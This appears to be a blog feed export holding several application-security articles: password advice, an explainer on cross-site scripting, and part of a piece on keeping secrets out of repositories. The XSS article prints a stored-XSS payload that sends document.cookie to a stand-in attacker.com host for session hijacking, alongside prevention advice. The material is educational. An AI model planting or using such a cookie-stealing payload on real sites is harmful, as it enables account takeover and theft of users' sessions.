&lt;p&gt;As a user, you should &lt;strong&gt;use different passwords for different services&lt;/strong&gt;. The passwords should not be super weak as well (e.g. guessable). This combination makes it impossible for me to just memorize. I have only a handful of strong passwords I memorize. For the rest, I need to &lt;strong&gt;use a password manager&lt;/strong&gt;. The password manager can then suggest strong passwords as well.&lt;/p&gt;
&lt;p&gt;A strong password has high entropy. This means:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;At least 8 characters. Let&amp;rsquo;s rather be safe and have at least 10 characters.&lt;/li&gt;
&lt;li&gt;A rich character set (e.g. upper- and lower-case letters, digits, special characters)&lt;/li&gt;
&lt;li&gt;Is not a combination of only two or three words in a dictionary&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can also &lt;strong&gt;change your passwords regularly&lt;/strong&gt;. This will make sure that people who had access for a while without being noticed will be blocked out again.&lt;/p&gt;
&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
&lt;p&gt;It feels like &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; / &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; made a video about all the security topics I want to write about üòÑ&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/8ZtInClXe1Q" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="Password"></category></entry><entry><title>Cross-site Scripting (XSS) üòà</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f" rel="alternate"></link><published>2020-10-16T20:00:00+02:00</published><updated>2020-10-16T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-16:/https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f</id><summary type="html">&lt;p&gt;Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&amp;rsquo; machine.&lt;/p&gt;
&lt;p&gt;Various types of XSS are distinguished:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: The attacker can make the website store the XSS ‚Ä¶&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;Cross-site scripting (XSS) is a type of attack on websites where the attacker can make the attacked website deliver JavaScript to the user. This malicious JavaScript is then executed on the users&amp;rsquo; machine.&lt;/p&gt;
&lt;p&gt;Various types of XSS are distinguished:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt;: The attacker can make the website store the XSS, e.g. by crafting a comment on Facebook or a chat message on Twitch which contains the malicious message. The malicious message is then delivered to every new client which accesses the page.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reflected XSS&lt;/strong&gt;: Some websites allow you to create links that you can share. For example, a Google search. The URL contains the search term and if somebody clicks on that link, Google will show the search term from the link on the page. So Google reflects a parameter of the link on the page. If an attacker changes the search term to contain code, that code could potentially be executed by the browser of any user who clicks on the link.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DOM-based XSS&lt;/strong&gt;: In modern web applications the logic is mostly in the client. This means the attacker does not have to go to the server-side to do harm. The on-site JavaScript is attacked. In contrast to the reflected XSS, the server didn&amp;rsquo;t directly cause the issue. The (valid) JavaScript on the page read the attack.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;strong&gt;attack surface&lt;/strong&gt; is pretty big for modern websites. Any user-supplied
data can contain an XSS attack. It could be a comments section, advertisement,
the document.referrer, URL fragments, &amp;hellip;&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;XSS is part of the &lt;a href="https://owasp.org/www-project-top-ten/"&gt;OWASP Top-10&lt;/a&gt;, meaning it&amp;rsquo;s recognized as a common vulnerability&lt;/li&gt;
&lt;li&gt;There are &lt;strong&gt;14,625 CVE entries for XSS&lt;/strong&gt; vulnerabilities on mitre.org (&lt;a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=cross-site"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2005&lt;/strong&gt;: MySpace had a worm called &lt;a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)"&gt;Samy&lt;/a&gt;. Within 20 hours, the author got one million users to friend him (&lt;a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever"&gt;source&lt;/a&gt;). &lt;strong&gt;MySpace had to take the site down because of this XSS attack.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2011&lt;/strong&gt;: Facebook worm allows automatic wall posts (&lt;a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6c4ddf17-8e6d-4e92-8bec-f918cbf61afc&amp;amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;amp;tab=librarydocuments"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: PayPal was vulnerable as discovered by &lt;a href="https://s3cur3.it/references"&gt;Robert Kugler&lt;/a&gt; (&lt;a href="https://seclists.org/fulldisclosure/2013/May/163"&gt;source&lt;/a&gt;). It was likely possible to create a link which made a payment when you clicked on it, without you needing to interact.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2013&lt;/strong&gt;: Yahoo was vulnerable to reflected XSS (&lt;a href="https://arstechnica.com/information-technology/2013/01/how-yahoo-allowed-hackers-to-hijack-my-neighbors-e-mail-account/"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2016&lt;/strong&gt;: Researcher found XSS vulnerability on Facebook (&lt;a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/"&gt;source&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2018&lt;/strong&gt;: Uber was vulnerable to a reflected XSS attack (&lt;a href="https://hackerone.com/reports/191810"&gt;source&lt;/a&gt;). Uber paid $3000 for it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Steam was vulnerable to a stored XSS attack (&lt;a href="https://hackerone.com/reports/409850"&gt;source&lt;/a&gt;). Steam paid $7500 for it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Facebook paid &lt;strong&gt;$20,000&lt;/strong&gt; for finding an XSS attack (&lt;a href="https://portswigger.net/daily-swig/xss-vulnerability-in-login-with-facebook-button-earns-20-000-bug-bounty"&gt;source&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Tumblr was vulnerable to a DOM-based XSS attack (&lt;a href="https://hackerone.com/reports/882546"&gt;source&lt;/a&gt;). Automattic paid $350 for it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Photo by Aar&amp;oacute;n Blanco Tejedor on Unsplash" src="https://cdn-images-1.medium.com/max/9856/0*ExwQ55rXgbShCgmN"/&gt;&lt;em&gt;Photo by &lt;a href="https://unsplash.com/@healing_photographer?utm_source=medium&amp;amp;utm_medium=referral"&gt;Aar&amp;oacute;n Blanco Tejedor&lt;/a&gt; on &lt;a href="https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral"&gt;Unsplash&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id="how-are-xss-attacks-executed"&gt;How are XSS attacks executed?&lt;/h2&gt;
&lt;p&gt;There are various ways attackers can do harm: They can &lt;strong&gt;make the website
unusable&lt;/strong&gt; if the XSS script is on it. They can run a &lt;strong&gt;cryptocurrency miner&lt;/strong&gt;.
They can &lt;strong&gt;steal sensitive data&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;As promised, it follows how to design a &lt;strong&gt;cookie stealer&lt;/strong&gt; for &lt;strong&gt;account
hijacking&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We just assume that we have a website like Facebook where you can add comments
to posts. We assume that the comments are just taken as is and copied to
everybody who opens the page. The comment we make is&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;Image&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;image&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'[https://attacker.com/steal?cookie='&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookie&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;https&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="c1"&gt;//attacker.com/?'+document.cookie);&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You can see that this will not do anything &amp;mdash; for the other users, this will
just look like an empty message. It will not refresh the page. It will not open
another window. But it will call http://attacker.com/steal with a GET request
which has a cookie parameter. Hence on the side of the attacker there only
needs to be a web server that is reachable and logs those requests. After that,
the attacker can use the cookie and impersonate the victim. The attacker
doesn&amp;rsquo;t know the victims' credentials but hijacked the session instead.&lt;/p&gt;
&lt;h2 id="what-can-i-do-to-prevent-xss-attacks"&gt;What can I do to prevent XSS attacks?&lt;/h2&gt;
&lt;p&gt;Never blindly trust user data. Remove potentially harmful parts, escape parts
that will change the expected output. You might want to remove and &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;
tags or replace &lt;code&gt;&amp;lt;&lt;/code&gt; by &lt;code&gt;&amp;amp;lt;&lt;/code&gt;. It&amp;rsquo;s not enough, though. You can also execute
JavaScript with the
&lt;a href="https://www.w3schools.com/jsref/event_onload.asp"&gt;onload attribute&lt;/a&gt;. That
attribute can be added to many or even all HTML tags.&lt;/p&gt;
&lt;p&gt;Various languages have methods to escape those:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Go: &lt;a href="https://golang.org/pkg/html/#EscapeString"&gt;EscapeString&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Java: &lt;a href="https://commons.apache.org/proper/commons-lang/javadocs/api-2.6/org/apache/commons/lang/StringEscapeUtils.html#escapeHtml(java.lang.String)"&gt;org.apache.commons.lang.StringEscapeUtils.escapeHtml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;JavaScript: &lt;a href="https://www.npmjs.com/package/dompurify"&gt;DOMPurify&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Python: &lt;a href="https://docs.python.org/3/library/html.html#html.escape"&gt;html.escape&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;PHP: &lt;a href="https://www.php.net/manual/en/function.htmlspecialchars.php"&gt;htmlspecialchars&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Ruby: &lt;a href="https://ruby-doc.org/stdlib-2.6.3/libdoc/erb/rdoc/ERB/Util.html#method-c-html_escape"&gt;htmlescape&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Rust: &lt;a href="https://docs.rs/htmlescape/0.3.1/htmlescape/fn.encode_minimal.html"&gt;htmlescape::encode_miniaml&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also, make sure you do that as early as possible. There should be a secure way
to use data from the database &amp;mdash; and that should not require to know that there
is potentially harmful data within it. So escape the data before you put it in
the DB. Make sure escaping is
&lt;a href="https://en.wikipedia.org/wiki/Idempotence"&gt;idempotent&lt;/a&gt; &amp;mdash; escaping two times
should be the same as escaping once. If you really think you need the original
somewhere, you can have a _raw field in the database. Or you have a data access
layer (DAL) that takes care of the escaping.&lt;/p&gt;
&lt;p&gt;Remember to &lt;strong&gt;sanitize ALL user inputs&lt;/strong&gt;, not only stuff that was in input fields. Don&amp;rsquo;t forget about &lt;a href="https://martin-thoma.com/tags.html#klausur-ref"&gt;URL fragments&lt;/a&gt; and &lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer"&gt;Document.referrer&lt;/a&gt; .&lt;/p&gt;
&lt;h2 id="see-also"&gt;See also&lt;/h2&gt;
&lt;p&gt;I love &lt;a href="https://en.wikipedia.org/wiki/Tom_Scott_(entertainer)"&gt;Tom Scott&lt;/a&gt; and &lt;a href="https://www.youtube.com/user/Computerphile"&gt;Computerphile&lt;/a&gt; and they made a video about the topic!&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;iframe allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/L5l9lSnNMxg" width="560"&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;/p&gt;
&lt;h2 id="whats-next"&gt;What&amp;rsquo;s next?&lt;/h2&gt;
&lt;p&gt;In this series about application security (AppSec) we already explained some of the techniques of the attackers üòà and also techniques of the defenders üòá:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Part 1: &lt;a href="https://medium.com/faun/sql-injections-e8bc9a14c95"&gt;SQL Injections&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 2: &lt;a href="https://levelup.gitconnected.com/leaking-secrets-240a3484cb80"&gt;Don&amp;rsquo;t leak Secrets&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 3: &lt;a href="https://levelup.gitconnected.com/cross-site-scripting-xss-fd374ce71b2f"&gt;Cross-Site Scripting (XSS)&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 4: &lt;a href="https://levelup.gitconnected.com/password-hashing-eb3b97684636"&gt;Password Hashing&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 5: &lt;a href="https://medium.com/bugbountywriteup/zip-bombs-30337a1b0112"&gt;ZIP Bombs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 6: &lt;a href="https://medium.com/plain-and-simple/captcha-500991bd90a3"&gt;CAPTCHA&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 7: &lt;a href="https://medium.com/bugbountywriteup/email-spoofing-9da8d33406bf"&gt;Email Spoofing&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 8: &lt;a href="https://medium.com/python-in-plain-english/software-composition-analysis-sca-7e573214a98e"&gt;Software Composition Analysis&lt;/a&gt; (SCA) üòá&lt;/li&gt;
&lt;li&gt;Part 9: &lt;a href="https://medium.com/faun/xxe-attacks-750e91448e8f"&gt;XXE attacks&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 10: &lt;a href="https://levelup.gitconnected.com/effective-access-control-331f883cb0ff"&gt;Effective Access Control&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 11: &lt;a href="https://medium.com/bugbountywriteup/dos-via-a-billion-laughs-9a79be96e139"&gt;DOS via a Billion Laughs&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 12: &lt;a href="https://medium.com/faun/full-disk-encryption-2090489f9760"&gt;Full Disk Encryption&lt;/a&gt; üòá&lt;/li&gt;
&lt;li&gt;Part 13: &lt;a href="https://medium.com/bugbountywriteup/insecure-deserialization-5c64e9943f0e"&gt;Insecure Deserialization&lt;/a&gt; üòà&lt;/li&gt;
&lt;li&gt;Part 14: &lt;a href="https://levelup.gitconnected.com/docker-security-5f4df118948c"&gt;Docker Security&lt;/a&gt; üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;And this is about to come:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CSRF üòà&lt;/li&gt;
&lt;li&gt;DOS üòà&lt;/li&gt;
&lt;li&gt;ReDoS üòà&lt;/li&gt;
&lt;li&gt;Credential Stuffing üòà&lt;/li&gt;
&lt;li&gt;Cryptojacking üòà&lt;/li&gt;
&lt;li&gt;Single-Sign-On üòá&lt;/li&gt;
&lt;li&gt;Two-Factor Authentication üòá&lt;/li&gt;
&lt;li&gt;Backups üòá&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let me know if you are interested in more articles around AppSec / InfoSec!&lt;/p&gt;</content><category term="Security"></category><category term="InfoSec"></category><category term="AppSec"></category><category term="Security"></category><category term="Cybersecurity"></category><category term="XSS"></category></entry><entry><title>Leaking Secrets üòá</title><link href="https://martin-thoma.com/https://levelup.gitconnected.com/leaking-secrets-240a3484cb80" rel="alternate"></link><published>2020-10-13T20:00:00+02:00</published><updated>2020-10-13T20:00:00+02:00</updated><author><name>Martin Thoma</name></author><id>tag:martin-thoma.com,2020-10-13:/https://levelup.gitconnected.com/leaking-secrets-240a3484cb80</id><summary type="html">&lt;p&gt;One of the worst mistakes one can make in application security is to publicly post secrets. That can be API keys, database credentials, service tokens, or private keys for asymmetric cryptography such as RSA as used for GPG.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s best to prevent leaking credentials completely, but if it&amp;rsquo;s ‚Ä¶&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the worst mistakes one can make in application security is to publicly post secrets. That can be API keys, database credentials, service tokens, or private keys for asymmetric cryptography such as RSA as used for GPG.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s best to prevent leaking credentials completely, but if it&amp;rsquo;s done you need to change them directly. You cannot hope that nobody has noticed it. People are scanning the public repositories for committed secrets.&lt;/p&gt;
&lt;h2 id="why-it-matters"&gt;Why it Matters&lt;/h2&gt;
&lt;p&gt;Leaking secrets and credentials happens more often than one would think. I&amp;rsquo;m a bit astonished that we don&amp;rsquo;t see this more often in news articles, but there are certainly some hacks that could be traced back to leaked secrets:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2017&lt;/strong&gt;: Uber paid $100,000 to hackers who got personal data of 57 million customers.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2019&lt;/strong&gt;: Researchers find over 200,000 unique secrets on GitHub. They describe their methodology and findings in &amp;ldquo;&lt;a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04B-3_Meli_paper.pdf"&gt;How Bad Can It Git? Characterizing Secret Leakage in Public GitHub Repositories&lt;/a&gt;&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2020&lt;/strong&gt;: Daimlers' internal Gitlab was open to the public (&lt;a href="https://www.zdnet.com/article/mercedes-benz-onboard-logic-unit-olu-source-code-leaks-online/"&gt;source&lt;/a&gt;). If there were any credentials in any of the repositories, they are now public as well. This is why &lt;a href="https://en.wikipedia.org/wiki/Defence_in_depth"&gt;Defence in Depth&lt;/a&gt; makes sense. Don&amp;rsquo;t store your secrets in a repository, even if the repository is private.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="how-leaking-of-secrets-happens"&gt;How leaking of secrets happens&lt;/h2&gt;
&lt;p&gt;It&amp;rsquo;s a mixture of missing knowledge, laziness, and human error. If people don&amp;rsquo;t know how to store the secrets properly, they just store them in a way that they know of. Even if people know how to do it well, it&amp;rsquo;s just so much simpler to directly copy the secret in the repository. And, of course, adding stuff that was not intended to be added also happens.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Adding secrets to a public repository&lt;/strong&gt; is the most obvious mistake one can do. &lt;strong&gt;Adding secrets to log messages&lt;/strong&gt; is more indirect and should not cause an immediate issue. However, it can allow a multi-step attack. For this reason &amp;ldquo;defense in depth&amp;rdquo; makes sense and thus secrets should not be part of log messages. It&amp;rsquo;s not even necessary that an attacker gets direct access to the log files. Maybe a developer shares a part of the logs publicly to investigate an issue. The problem is that people don&amp;rsquo;t tend to think of logs as a security-critical part of the software landscape.&lt;/p&gt;
&lt;h2 id="how-can-i-prevent-leaking-secrets"&gt;How can I prevent leaking secrets?&lt;/h2&gt;
&lt;p&gt;First, you need to make sure that people don&amp;rsquo;t see a need to use secrets in an unsafe way any longer. Then you can make it harder to commit secrets via &lt;strong&gt;pre-commit&lt;/strong&gt; hooks. Finally, you &lt;strong&gt;check on the server-side&lt;/strong&gt; when secrets were added.&lt;/p&gt;
&lt;h3 id="logging"&gt;Logging&lt;/h3&gt;
&lt;p&gt;Either don&amp;rsquo;t log environment variables at all or make REALLY sure that there are no secrets inside. You can also blacklist patterns as &lt;a href="undefined"&gt;Joe Crobak&lt;/a&gt; showed in his post &amp;ldquo;&lt;a href="https://medium.com/@joecrobak/seven-best-practices-for-keeping-sensitive-data-out-of-logs-3d7bbd12904"&gt;Seven Best Practices for Keeping Sensitive Data Out of Logs&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;
&lt;h3 id="storing-secrets-locally-direnv"&gt;Storing Secrets Locally: Direnv&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://direnv.net/"&gt;direnv&lt;/a&gt; is a shell extension that makes your shell execute an .envrc file if you are in the folder or a subfolder. Such a file can look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_ACCESS_KEY_ID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;AKIAIOSFODNN7EXAMPLE
&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_SECRET_ACCESS_KEY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;wJalrXUtnFEMI/K7MDENG/bPxRfYEXAMPLEKEY
&lt;span class="nb"&gt;export&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;AWS_DEFAULT_REGION&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;us-west-2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure the .envrc file is kept private by adding it to the .gitignore file.&lt;/p&gt;
&lt;p&gt;Wherever people would have used their secrets in the code, they now can use the environment variable instead.&lt;/p&gt;
&lt;p&gt;Storing secrets in environment variables is far from being optimal as every single process can easily access them. However, it is better than storing them in a file that is accessible even to other systems. In the worst case even to the public internet.&lt;/p&gt;
&lt;h3 id="pre-commit-hooks"&gt;Pre-commit hooks&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://pre-commit.com/"&gt;pre-commit&lt;/a&gt; is an application that helps you to apply git hooks. Those are executed before code is added to the git repository.&lt;/p&gt;
&lt;p&gt;You can make sure that no AWS credentials or private keys are added to the repository by creating the following .pre-commit-config.yaml file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nt"&gt;repos&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p p-Indicator"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;https&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;//github.com/pre-commit/pre-commit-hooks&lt;/span&gt;&lt;span class="p p-Indicator"&gt;]&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;(https://github.com/pre-commit/pre-commit-hooks)&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;v3.2.0&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-aws-credentials&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;detect-private-key&lt;/span&gt;
&lt;span class="p p-Indicator"&gt;-&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;git@github.com:Yelp/detect-secrets&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;v0.14.3&lt;/span&gt;
